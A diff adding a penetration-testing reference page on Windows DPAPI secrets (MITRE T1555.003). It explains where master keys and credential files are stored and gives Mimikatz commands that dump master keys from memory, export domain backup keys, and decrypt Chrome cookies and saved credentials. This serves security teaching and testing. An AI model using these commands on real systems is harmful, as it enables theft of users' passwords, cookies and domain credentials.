@@ -1,2 +1,63 @@
-# 🛠️ DPAPI protected secrets
+---
+description: MITRE ATT&CK™ Sub-technique T1555.003
+---
+
+# 🛠️ DPAPI secrets
+
+## Theory
+
+The DPAPI \(Data Protection API\) is an internal component in the Windows system. It allows various applications to store sensitive data \(e.g. passwords\). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:
+
+```bash
+C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
+```
+
+Application like Google Chrome, Outlook, Internet Explorer, Skype use the DPAPI. Windows also uses that API for sensitive information like Wi-Fi passwords, certificates, RDP connection passwords, and many more.
+
+Below are common paths of hidden files that usually contain DPAPI-protected data.
+
+```bash
+C:\Users\$USER\AppData\Local\Microsoft\Credentials\
+C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
+```
+
+## Practice
+
+{% tabs %}
+{% tab title="UNIX-like" %}
+From UNIX-like systems, DPAPI-data can be manipulated \(mainly offline\) with tools like [dpapick](https://github.com/jordanbtucker/dpapick) \(Python\), [dpapilab](https://github.com/dfirfpi/dpapilab) \(Python\), [Impacket](https://github.com/SecureAuthCorp/impacket)'s [dpapi.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py) and [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) \(Python\).
+{% endtab %}
+
+{% tab title="Windows" %}
+On Windows systems [Mimikatz](https://github.com/gentilkiwi/mimikatz) \(C\) can be used to extract, decrypt or use specific master keys using specified passwords or given sufficient privileges.
+
+```bash
+# Extract and decrypt a master key
+dpapi::masterkey /in:"C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID" /sid:$SID /password:$PASSWORD /protected
+
+# Extract and decrypt all master keys
+sekurlsa::dpapi
+
+# Extract the backup keys & use it to decrypt a master key
+lsadump::backupkeys /system:$DOMAIN_CONTROLLER /export
+dpapi::masterkey /in:"C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID" /pvk:$BACKUP_KEY_EXPORT_PVK
+
+# Decrypt Chrome data
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies"
+
+# Decrypt DPAPI-protected data using a master key
+dpapi::cred /in:"C:\path\to\encrypted\file" /masterkey:$MASTERKEY
+```
+{% endtab %}
+{% endtabs %}
+
+## Resources
+
+{% embed url="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords" %}
+
+{% embed url="https://www.synacktiv.com/ressources/univershell\_2017\_dpapi.pdf" %}
+
+
+
+
 
